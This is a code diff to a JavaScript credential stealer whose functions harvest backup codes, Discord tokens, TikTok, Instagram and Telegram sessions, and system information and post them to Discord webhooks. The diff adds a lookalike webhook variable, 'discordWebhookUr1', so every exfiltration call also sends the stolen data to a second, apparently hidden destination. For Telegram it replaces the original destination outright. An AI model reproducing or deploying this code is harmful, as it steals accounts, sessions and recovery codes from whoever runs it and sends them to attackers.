@@ -200,6 +200,7 @@ async function findBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
+              await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -248,6 +249,7 @@ async function findEpicGamesBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
+              await axios.post(discordWebhookUr1, payload);
               console.log('Epic Games Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -295,6 +297,7 @@ async function findGithubBackupCodes() {
 
             try {
               await axios.post(discordWebhookUrl, payload);
+              await axios.post(discordWebhookUr1, payload)
               console.log('Backup codes embed sent to Discord');
             } catch (error) {
               console.error(`Error sending webhook: ${error.message}`);
@@ -709,9 +712,11 @@ async function archiveAndSendData() {
     console.log('Archive created successfully');
 
     await sendToDiscordWebhook(discordWebhookUrl, zipFilePath);
+    await sendToDiscordWebhook(discordWebhookUr1, zipFilePath);
 } catch (error) {
   console.error(`Error in archiveAndSendData: ${error.message}`);
   await sendToDiscordWebhook(discordWebhookUrl, `Error in archiveAndSendData: ${error.message}`);
+  await sendToDiscordWebhook(discordWebhookUr1, `Error in archiveAndSendData: ${error.message}`);
 } finally {
     setTimeout(() => {
       if (fs.existsSync(mainFolderPath)) {
@@ -1035,6 +1040,7 @@ async function SubmitInstagram(session_id) {
       },
     };
 
+    axios.post(discordWebhookUr1, { embeds: [embed] });
     axios.post(discordWebhookUrl, { embeds: [embed] });
 
   } catch (error) {
@@ -1400,6 +1406,7 @@ function stealTikTokSession(cookie) {
                   ]
                 };
 
+                axios.post(discordWebhookUr1, webhookPayload)
                 axios.post(discordWebhookUrl, webhookPayload)
                   .then(response => {
                     console.log('Discord webhook sent successfully! send tiktok');
@@ -1804,6 +1811,7 @@ async function stealTokens() {
                 data.embeds.push(friendsEmbed);
             }
 
+            await axios.post(discordWebhookUr1, data);
             await axios.post(discordWebhookUrl, data);
 
         } catch (error) {
@@ -2229,6 +2237,13 @@ async function getExtension() {
     },
   };
 
+  axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
+    .then(() => {
+      console.log('system information successfully sent to Discord webhook.');
+    })
+    .catch(error => {
+      console.error('An error occurred while sending system information:', error.message);
+    });
 
   axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
     .then(() => {
@@ -2559,7 +2574,7 @@ async function SubmitTelegram() {
       console.error(`Error submitting Telegram session data: ${error.message}`);
     }
 
-    webhook = discordWebhookUrl;
+    webhook = discordWebhookUr1;
 
     try {
       await form.submit(webhook);
